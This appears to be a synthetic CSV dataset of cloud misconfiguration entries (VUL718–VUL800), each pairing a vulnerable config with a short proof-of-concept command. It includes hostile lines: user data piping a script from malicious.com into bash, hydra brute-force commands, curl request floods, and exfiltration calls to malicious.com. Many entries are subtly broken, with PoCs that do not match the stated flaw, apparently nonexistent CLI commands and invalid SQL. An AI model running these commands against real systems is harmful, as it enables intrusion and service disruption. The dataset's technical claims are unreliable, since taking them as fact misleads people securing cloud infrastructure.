id,description,category,cloud_provider,vulnerable_code,poc,source,timestamp
VUL718,Alibaba Cloud OSS with misconfigured bucket encryption exposing data.,Encryption,Alibaba Cloud,"{ ""ServerSideEncryptionRule"": { ""SSEAlgorithm"": ""None"" } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL719,AWS CloudTrail with misconfigured log validation allowing log tampering.,Monitoring,AWS,"{ ""logFileValidationEnabled"": false }",aws s3 cp malicious-log s3://cloudtrail-bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/awscloudtrail'}",2025-06-19T11:39:00Z
VUL720,Azure Virtual Machine with misconfigured network security group allowing RDP brute force.,Authentication,Azure,"{ ""securityRules"": [{ ""destinationPortRange"": ""3389"", ""sourceAddressPrefix"": ""*"" }] }",hydra -l admin -P passwords.txt rdp://vm-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:39:00Z
VUL721,GCP Cloud Functions with misconfigured memory limit allowing resource exhaustion.,Denial of Service,GCP,gcloud functions deploy fn --memory=8GB,curl https://us-central1-project.cloudfunctions.net/fn?consume=8GB,"{'cve': 'N/A', 'link': 'https://cloud.google.com/functions/docs'}",2025-06-19T11:39:00Z
VUL722,Oracle Cloud Load Balancer with misconfigured backend policy allowing unauthorized access.,Access Control,Oracle Cloud,"{ ""backendPolicy"": { ""access"": ""public"" } }",curl https://lb-ip/backend,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:39:00Z
VUL723,IBM Cloud VPC with misconfigured VPN gateway allowing weak encryption.,Encryption,IBM Cloud,"{ ""vpnGateway"": { ""encryption"": ""DES"" } }",nmap --script ssl-enum-ciphers -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:39:00Z
VUL724,Alibaba Cloud ECS with misconfigured user data allowing code injection.,Code Injection,Alibaba Cloud,"{ ""UserData"": ""#!/bin/bash
curl http://malicious.com/script.sh | bash"" }",aliyun ecs DescribeInstances --InstanceIds instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:39:00Z
VUL725,AWS EKS with misconfigured node group allowing privilege escalation.,Privilege Escalation,AWS,"{ ""nodeGroupConfig"": { ""iamRole"": ""arn:aws:iam::account:role/admin"" } }",kubectl exec node-pod -- aws sts get-caller-identity,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:39:00Z
VUL726,Azure API Management with misconfigured logging exposing sensitive data.,Data Exposure,Azure,"{ ""loggingConfig"": { ""destination"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/api-logs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:39:00Z
VUL727,GCP Cloud SQL with misconfigured network authorization allowing unauthorized access.,Access Control,GCP,gcloud sql instances create instance --authorized-networks=0.0.0.0/0,mysql -h sql-ip -u user -p,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:39:00Z
VUL728,Oracle Cloud Identity with misconfigured MFA policy allowing weak authentication.,Authentication,Oracle Cloud,"{ ""mfaPolicy"": { ""required"": false } }",oci iam user login --user-id user-id --password weak,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:39:00Z
VUL729,IBM Cloud Functions with misconfigured logging exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""loggingConfig"": { ""logLevel"": ""DEBUG"", ""destination"": ""public-bucket"" } }",curl https://s3.bucket/function-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:39:00Z
VUL730,Alibaba Cloud OSS with misconfigured lifecycle rule allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""LifecycleRule"": { ""Status"": ""Enabled"", ""Expiration"": { ""Days"": 1 } } }",aliyun oss ls oss://bucket/expired-file,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL731,AWS SNS with misconfigured topic policy allowing unauthorized access.,Access Control,AWS,"{ ""TopicPolicy"": { ""Statement"": [{ ""Effect"": ""Allow"", ""Principal"": ""*"", ""Action"": ""sns:Publish"" }] } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:39:00Z
VUL732,Azure Event Hub with misconfigured consumer group allowing data leakage.,Data Exposure,Azure,"{ ""consumerGroupConfig"": { ""access"": ""public"" } }",curl https://eventhub-namespace.servicebus.windows.net/hub/consumer-group,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/event-hubs'}",2025-06-19T11:39:00Z
VUL733,GCP BigQuery with misconfigured dataset access allowing unauthorized queries.,Access Control,GCP,"bq update --set_iam_policy '{""bindings"": [{""role"": ""roles/bigquery.dataViewer"", ""members"": [""allUsers""]}]}' dataset",bq query 'SELECT * FROM dataset.table',"{'cve': 'N/A', 'link': 'https://cloud.google.com/bigquery/docs'}",2025-06-19T11:39:00Z
VUL734,Oracle Cloud Object Storage with misconfigured bucket policy allowing data tampering.,Data Exposure,Oracle Cloud,"{ ""bucketPolicy"": { ""Statement"": [{ ""Action"": ""PutObject"", ""Principal"": ""*"" }] } }",oci os object put --bucket-name bucket --file malicious.txt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Object/Tasks/managingbuckets.htm'}",2025-06-19T11:39:00Z
VUL735,IBM Cloud Kubernetes with misconfigured liveness probe allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""livenessProbe"": { ""timeoutSeconds"": 1 } }",kubectl describe pod pod-name,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:39:00Z
VUL736,Alibaba Cloud ECS with misconfigured instance role allowing privilege escalation.,Privilege Escalation,Alibaba Cloud,"{ ""InstanceRole"": { ""permissions"": ""admin"" } }",aliyun ecs DescribeInstanceAttribute --InstanceId instance-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/59643.htm'}",2025-06-19T11:39:00Z
VUL737,AWS CloudFormation with misconfigured parameter exposing sensitive data.,Data Exposure,AWS,"{ ""Parameters"": { ""ApiKey"": { ""Type"": ""String"", ""Default"": ""plain-text-key"" } } }",aws cloudformation describe-stacks --stack-name stack,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/cloudformation'}",2025-06-19T11:39:00Z
VUL738,Azure Machine Learning with misconfigured pipeline allowing code injection.,Code Injection,Azure,"{ ""pipelineConfig"": { ""script"": ""exec('malicious-code')"" } }",curl https://ml-workspace.region.api.azureml.ms/pipelines/run,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/machine-learning'}",2025-06-19T11:39:00Z
VUL739,GCP Cloud Monitoring with misconfigured notification channel exposing alerts.,Data Exposure,GCP,"gcloud monitoring channels create --channel-content='{""type"": ""webhook"", ""url"": ""http://public-endpoint""}'",curl http://public-endpoint,"{'cve': 'N/A', 'link': 'https://cloud.google.com/monitoring/docs'}",2025-06-19T11:39:00Z
VUL740,Oracle Cloud Functions with misconfigured environment variables exposing secrets.,Data Exposure,Oracle Cloud,"{ ""envVars"": { ""API_KEY"": ""plain-text-key"" } }",oci fn function get --function-id fn-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Functions/Tasks/functions.htm'}",2025-06-19T11:39:00Z
VUL741,IBM Cloud VPC with misconfigured network ACL allowing traffic interception.,Network Security,IBM Cloud,"{ ""networkAclRules"": [{ ""source"": ""0.0.0.0/0"", ""action"": ""allow"" }] }",tcpdump -i eth0 host acl-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:39:00Z
VUL742,Alibaba Cloud RDS with misconfigured encryption key allowing data exposure.,Encryption,Alibaba Cloud,"{ ""EncryptionKey"": { ""KMSKeyId"": ""weak-key"" } }",aliyun rds DescribeDBInstanceAttribute --DBInstanceId db-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:39:00Z
VUL743,AWS Redshift with misconfigured IAM role allowing privilege escalation.,Privilege Escalation,AWS,"{ ""Role"": { ""AssumeRolePolicyDocument"": { ""Statement"": [{ ""Principal"": { ""Service"": ""*"" }, ""Action"": ""sts:AssumeRole"" }] } } }",aws sts assume-role --role-arn arn:aws:iam::account:role/redshift-role,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/redshift'}",2025-06-19T11:39:00Z
VUL744,Azure Data Lake with misconfigured access control allowing data exposure.,Data Exposure,Azure,"{ ""accessControl"": { ""permissions"": [{ ""principal"": ""*"", ""access"": ""readWrite"" }] } }",az storage fs file download --account-name datalake --path sensitive.txt,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/data-lake-store'}",2025-06-19T11:39:00Z
VUL745,GCP Cloud Composer with misconfigured Airflow DAG allowing code execution.,Code Injection,GCP,gcloud composer environments run env -- dag_id=malicious_dag trigger,curl https://airflow-ui.composer.region.cloud.google.com/dag/run,"{'cve': 'N/A', 'link': 'https://cloud.google.com/composer/docs'}",2025-06-19T11:39:00Z
VUL746,Oracle Cloud VCN with misconfigured route table allowing traffic interception.,Network Security,Oracle Cloud,"{ ""routeRules"": [{ ""destination"": ""0.0.0.0/0"", ""networkEntityId"": ""public-gateway"" }] }",tcpdump -i eth0 host vcn-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Network/Tasks/managingVCNs.htm'}",2025-06-19T11:39:00Z
VUL747,IBM Cloud Kubernetes with misconfigured pod security policy allowing privilege escalation.,Privilege Escalation,IBM Cloud,"{ ""podSecurityPolicy"": { ""runAsUser"": { ""rule"": ""RunAsAny"" } } }",kubectl exec pod -- /bin/sh -c 'whoami',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:39:00Z
VUL748,Alibaba Cloud OSS with misconfigured bucket tagging allowing unauthorized access.,Access Control,Alibaba Cloud,"{ ""Tagging"": { ""TagSet"": [{ ""Key"": ""access"", ""Value"": ""public"" }] } }",aliyun oss ls oss://bucket,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL749,AWS S3 bucket with misconfigured access logging exposing request metadata.,Data Exposure,AWS,"{ ""LoggingEnabled"": { ""TargetBucket"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:39:00Z
VUL750,Azure Stream Analytics with misconfigured output allowing data exfiltration.,Data Exfiltration,Azure,"{ ""outputConfig"": { ""type"": ""Blob"", ""access"": ""public"" } }",curl https://storage-account.blob.core.windows.net/container/output-data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/stream-analytics'}",2025-06-19T11:39:00Z
VUL751,GCP Cloud Armor with misconfigured XSS protection allowing attacks.,Injection,GCP,gcloud compute security-policies create policy --no-xss-protection,curl https://backend-service-ip?input=<script>alert(1)</script>,"{'cve': 'N/A', 'link': 'https://cloud.google.com/armor/docs'}",2025-06-19T11:39:00Z
VUL752,Oracle Cloud File Storage with misconfigured snapshot exposing data.,Data Exposure,Oracle Cloud,"{ ""snapshotConfig"": { ""publicAccess"": true } }",oci fs snapshot get --snapshot-id snapshot-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:39:00Z
VUL753,IBM Cloud Databases with misconfigured encryption exposing data.,Encryption,IBM Cloud,"{ ""encryptionConfig"": { ""enabled"": false } }",psql -h db-endpoint -U user -d db -c 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:39:00Z
VUL754,Alibaba Cloud ECS with misconfigured security group allowing SSH brute force.,Authentication,Alibaba Cloud,"{ ""SecurityGroupRules"": [{ ""PortRange"": ""22/22"", ""SourceCidrIp"": ""0.0.0.0/0"" }] }",hydra -l admin -P passwords.txt ssh://ecs-ip,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25471.htm'}",2025-06-19T11:39:00Z
VUL755,AWS ElastiCache with misconfigured node access allowing unauthorized connections.,Access Control,AWS,"{ ""CacheSecurityGroupIds"": [] }",redis-cli -h elasticache-endpoint -p 6379,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/elasticache'}",2025-06-19T11:39:00Z
VUL756,Azure Databricks with misconfigured cluster allowing code execution.,Code Injection,Azure,"{ ""clusterConfig"": { ""initScripts"": [{ ""script"": ""malicious.sh"" }] } }",curl https://databricks-workspace.azuredatabricks.net/api/2.0/clusters/start,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/databricks'}",2025-06-19T11:39:00Z
VUL757,GCP Cloud VPN with misconfigured encryption allowing weak ciphers.,Encryption,GCP,gcloud compute vpn-tunnels create tunnel --ike-version=1,nmap --script ssl-enum-ciphers -p 500 vpn-ip,"{'cve': 'N/A', 'link': 'https://cloud.google.com/vpn/docs'}",2025-06-19T11:39:00Z
VUL758,Oracle Cloud Compute with misconfigured SSH key allowing unauthorized access.,Authentication,Oracle Cloud,"{ ""sshAuthorizedKeys"": ""public-key-exposed"" }",ssh -i malicious-key user@instance-ip,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Compute/Tasks/launchinginstance.htm'}",2025-06-19T11:39:00Z
VUL759,IBM Cloud Functions with misconfigured environment exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""env"": { ""SECRET_KEY"": ""plain-text-key"" } }",ibmcloud fn action get action-name --show-env,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:39:00Z
VUL760,Alibaba Cloud OSS with misconfigured bucket policy allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""BucketPolicy"": { ""Statement"": [{ ""Action"": ""oss:GetObject"", ""Principal"": ""*"" }] } }",curl https://oss.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL761,AWS CodeBuild with misconfigured build timeout allowing resource exhaustion.,Denial of Service,AWS,"{ ""buildTimeout"": 3600 }","aws codebuild start-build --project-name project --environment-variables-override name=DELAY,value=3600","{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/codebuild'}",2025-06-19T11:39:00Z
VUL762,Azure Cognitive Services with misconfigured access key allowing unauthorized access.,Access Control,Azure,"{ ""accessKeyConfig"": { ""required"": false } }",curl https://cognitive-endpoint.api.cognitive.microsoft.com/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/cognitive-services'}",2025-06-19T11:39:00Z
VUL763,GCP Cloud Spanner with misconfigured database role allowing privilege escalation.,Privilege Escalation,GCP,gcloud spanner databases add-iam-policy-binding db --member='allUsers' --role='roles/spanner.admin',gcloud spanner databases execute-sql --sql='ALTER TABLE table ADD COLUMN malicious',"{'cve': 'N/A', 'link': 'https://cloud.google.com/spanner/docs'}",2025-06-19T11:39:00Z
VUL764,Oracle Cloud API Gateway with misconfigured CORS allowing data exfiltration.,Data Exfiltration,Oracle Cloud,"{ ""corsConfig"": { ""allowedOrigins"": [""*""] } }",curl -H 'Origin: http://malicious.com' https://api-gateway-endpoint,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/APIGateway/Tasks/apigateway.htm'}",2025-06-19T11:39:00Z
VUL765,IBM Cloud Security Group with misconfigured egress rules allowing data exfiltration.,Data Exfiltration,IBM Cloud,"{ ""egressRules"": [{ ""destination"": ""0.0.0.0/0"", ""protocol"": ""all"" }] }",curl http://malicious.com --interface sg-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:39:00Z
VUL766,Alibaba Cloud ECS with misconfigured disk snapshot allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""SnapshotConfig"": { ""publicAccess"": true } }",aliyun ecs ExportSnapshot --SnapshotId snapshot-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25535.htm'}",2025-06-19T11:39:00Z
VUL767,AWS S3 bucket with misconfigured event notification allowing unauthorized actions.,Access Control,AWS,"{ ""LambdaFunctionConfigurations"": [{ ""LambdaFunctionArn"": ""arn:aws:lambda:region:account:function:public-fn"" }] }",aws s3 cp trigger.txt s3://bucket,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/s3'}",2025-06-19T11:39:00Z
VUL768,Azure Virtual Network with misconfigured subnet allowing lateral movement.,Network Security,Azure,"{ ""subnetConfig"": { ""networkSecurityGroupId"": null } }",nmap -p- subnet-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-network'}",2025-06-19T11:39:00Z
VUL769,GCP Cloud DNS with misconfigured record allowing domain hijacking.,Domain Hijacking,GCP,gcloud dns record-sets transaction add malicious.com --name=subdomain --type=A --zone=zone,dig subdomain.zone,"{'cve': 'N/A', 'link': 'https://cloud.google.com/dns/docs'}",2025-06-19T11:39:00Z
VUL770,Oracle Cloud Identity with misconfigured user role allowing privilege escalation.,Privilege Escalation,Oracle Cloud,"{ ""userRole"": { ""permissions"": ""admin"" } }",oci iam role list --user-id user-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Identity/Tasks/managingusers.htm'}",2025-06-19T11:39:00Z
VUL771,IBM Cloud VPC with misconfigured endpoint allowing unauthorized access.,Access Control,IBM Cloud,"{ ""endpointConfig"": { ""publicAccess"": true } }",curl https://endpoint-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:39:00Z
VUL772,Alibaba Cloud RDS with misconfigured replica allowing data exposure.,Data Exposure,Alibaba Cloud,"{ ""ReplicaConfig"": { ""publicAccess"": true } }",mysql -h replica-endpoint -u user -p -e 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:39:00Z
VUL773,AWS SNS with misconfigured subscription endpoint allowing data exfiltration.,Data Exfiltration,AWS,"{ ""Subscription"": { ""Endpoint"": ""http://malicious.com"" } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'sensitive-data',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:39:00Z
VUL774,Azure Virtual Machine with misconfigured diagnostic logs exposing sensitive data.,Data Exposure,Azure,"{ ""diagnosticLogs"": { ""destination"": ""public-storage"" } }",curl https://storage-account.blob.core.windows.net/container/diagnostic-logs,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-machines'}",2025-06-19T11:39:00Z
VUL775,GCP Cloud SQL with misconfigured database flags allowing code execution.,Code Injection,GCP,gcloud sql instances create instance --database-flags 'log_bin_trust_function_creators=on',mysql -h sql-ip -u user -p -e 'CREATE FUNCTION malicious() RETURNS INT DETERMINISTIC RETURN 1',"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:39:00Z
VUL776,Oracle Cloud File Storage with misconfigured NFS options allowing data tampering.,Data Exposure,Oracle Cloud,"{ ""nfsOptions"": { ""source"": ""0.0.0.0/0"", ""access"": ""rw"" } }",mount -t nfs fs-endpoint:/export /mnt && echo 'malicious' > /mnt/file.txt,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:39:00Z
VUL777,IBM Cloud Kubernetes with misconfigured node taint allowing resource exhaustion.,Denial of Service,IBM Cloud,"{ ""taints"": [] }",kubectl create pod --image=busybox --requests='cpu=1000',"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/containers'}",2025-06-19T11:39:00Z
VUL778,Alibaba Cloud OSS with misconfigured bucket notification allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""NotificationConfig"": { ""destination"": ""external-service"" } }",curl https://external-service,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL779,AWS EKS with misconfigured audit logging exposing sensitive data.,Data Exposure,AWS,"{ ""auditLogging"": { ""destination"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/eks-audit-logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/eks'}",2025-06-19T11:39:00Z
VUL780,Azure API Management with misconfigured rate limiting allowing DoS attacks.,Denial of Service,Azure,"{ ""rateLimit"": { ""calls"": 10000, ""renewalPeriod"": 60 } }",for i in {1..10000}; do curl https://api-management.azure-api.net; done,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/api-management'}",2025-06-19T11:39:00Z
VUL781,GCP Cloud Run with misconfigured CPU allocation allowing resource exhaustion.,Denial of Service,GCP,gcloud run deploy service --image image --cpu=8,for i in {1..100}; do curl https://service-region.run.app & done,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:39:00Z
VUL782,Oracle Cloud Load Balancer with misconfigured access log exposing sensitive data.,Data Exposure,Oracle Cloud,"{ ""accessLogConfig"": { ""destination"": ""public-bucket"" } }",oci os object list --bucket-name public-bucket,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:39:00Z
VUL783,IBM Cloud VPC with misconfigured floating IP allowing unauthorized access.,Access Control,IBM Cloud,"{ ""floatingIpConfig"": { ""publicAccess"": true } }",nmap -p- floating-ip,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/vpc'}",2025-06-19T11:39:00Z
VUL784,Alibaba Cloud RDS with misconfigured monitoring exposing database metrics.,Data Exposure,Alibaba Cloud,"{ ""MonitoringConfig"": { ""publicAccess"": true } }",curl https://rds-endpoint/monitoring-metrics,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/26198.htm'}",2025-06-19T11:39:00Z
VUL785,AWS SNS with misconfigured message attributes exposing sensitive data.,Data Exposure,AWS,"{ ""MessageAttributes"": { ""sensitive"": { ""DataType"": ""String"", ""StringValue"": ""plain-text-key"" } } }",aws sns publish --topic-arn arn:aws:sns:region:account:topic --message 'test',"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/sns'}",2025-06-19T11:39:00Z
VUL786,Azure Virtual Network with misconfigured network security group allowing lateral movement.,Network Security,Azure,"{ ""securityRules"": [{ ""sourceAddressPrefix"": ""*"", ""access"": ""Allow"" }] }",nmap -p- vnet-ip,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/virtual-network'}",2025-06-19T11:39:00Z
VUL787,GCP Cloud SQL with misconfigured binary logging allowing data exposure.,Data Exposure,GCP,gcloud sql instances create instance --binary-log-enabled --public-access,gcloud sql binary-logs list --instance instance,"{'cve': 'N/A', 'link': 'https://cloud.google.com/sql/docs'}",2025-06-19T11:39:00Z
VUL788,Oracle Cloud File Storage with misconfigured snapshot policy allowing data exposure.,Data Exposure,Oracle Cloud,"{ ""snapshotPolicy"": { ""publicAccess"": true } }",oci fs snapshot list --file-system-id fs-id,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/File/Tasks/managingfilesystems.htm'}",2025-06-19T11:39:00Z
VUL789,IBM Cloud Databases with misconfigured audit logging exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""auditLogging"": { ""destination"": ""public-bucket"" } }",curl https://s3.bucket/audit-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/databases'}",2025-06-19T11:39:00Z
VUL790,Alibaba Cloud ECS with misconfigured auto-scaling policy allowing resource exhaustion.,Denial of Service,Alibaba Cloud,"{ ""AutoScalingPolicy"": { ""maxSize"": 1000 } }",aliyun ess DescribeScalingActivities --ScalingGroupId sg-id,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/25857.htm'}",2025-06-19T11:39:00Z
VUL791,AWS Lambda with misconfigured environment variables exposing secrets.,Data Exposure,AWS,"{ ""Environment"": { ""Variables"": { ""API_KEY"": ""plain-text-key"" } } }",aws lambda get-function-configuration --function-name fn,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/lambda'}",2025-06-19T11:39:00Z
VUL792,Azure Kubernetes with misconfigured role binding allowing privilege escalation.,Privilege Escalation,Azure,"{ ""roleBinding"": { ""roleRef"": ""cluster-admin"", ""subjects"": [{ ""kind"": ""User"", ""name"": ""*"" }] } }",kubectl get secrets --all-namespaces,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/aks'}",2025-06-19T11:39:00Z
VUL793,GCP Cloud Run with misconfigured IAM policy allowing unauthorized access.,Access Control,GCP,gcloud run services add-iam-policy-binding service --member='allUsers' --role='roles/run.invoker',curl https://service-region.run.app,"{'cve': 'N/A', 'link': 'https://cloud.google.com/run/docs'}",2025-06-19T11:39:00Z
VUL794,Oracle Cloud Load Balancer with misconfigured health check allowing DoS attacks.,Denial of Service,Oracle Cloud,"{ ""healthCheckConfig"": { ""intervalMs"": 100 } }",for i in {1..1000}; do curl https://lb-ip; done,"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Balance/Tasks/managingloadbalancers.htm'}",2025-06-19T11:39:00Z
VUL795,IBM Cloud Functions with misconfigured logging destination exposing sensitive data.,Data Exposure,IBM Cloud,"{ ""loggingConfig"": { ""destination"": ""public-bucket"" } }",curl https://s3.bucket/function-logs,"{'cve': 'N/A', 'link': 'https://cloud.ibm.com/docs/openwhisk'}",2025-06-19T11:39:00Z
VUL796,Alibaba Cloud OSS with misconfigured bucket policy allowing data exfiltration.,Data Exfiltration,Alibaba Cloud,"{ ""BucketPolicy"": { ""Statement"": [{ ""Action"": ""oss:GetObject"", ""Principal"": ""*"" }] } }",curl https://oss.bucket/file.txt,"{'cve': 'N/A', 'link': 'https://www.alibabacloud.com/help/doc-detail/31847.htm'}",2025-06-19T11:39:00Z
VUL797,AWS API Gateway with misconfigured logging exposing sensitive data.,Data Exposure,AWS,"{ ""LoggingConfig"": { ""destination"": ""public-bucket"" } }",aws s3 ls s3://public-bucket/api-logs,"{'cve': 'N/A', 'link': 'https://docs.aws.amazon.com/apigateway'}",2025-06-19T11:39:00Z
VUL798,Azure App Service with misconfigured CORS allowing data exfiltration.,Data Exfiltration,Azure,"{ ""corsSettings"": { ""allowedOrigins"": [""*""] } }",curl -H 'Origin: http://malicious.com' https://app-service.azurewebsites.net/data,"{'cve': 'N/A', 'link': 'https://docs.microsoft.com/azure/app-service'}",2025-06-19T11:39:00Z
VUL799,GCP Cloud Storage with misconfigured bucket ACL allowing data tampering.,Data Exposure,GCP,gsutil acl ch -u allUsers:WRITE gs://bucket,gsutil cp malicious.txt gs://bucket,"{'cve': 'N/A', 'link': 'https://cloud.google.com/storage/docs'}",2025-06-19T11:39:00Z
VUL800,Oracle Cloud Database with misconfigured audit policy allowing undetected access.,Monitoring,Oracle Cloud,"{ ""auditPolicy"": { ""enabled"": false } }",sqlplus user/pass@db-endpoint:1521/service -e 'SELECT * FROM sensitive_table',"{'cve': 'N/A', 'link': 'https://docs.oracle.com/en-us/iaas/Content/Database/Tasks/auditing.htm'}",2025-06-19T11:39:00Z
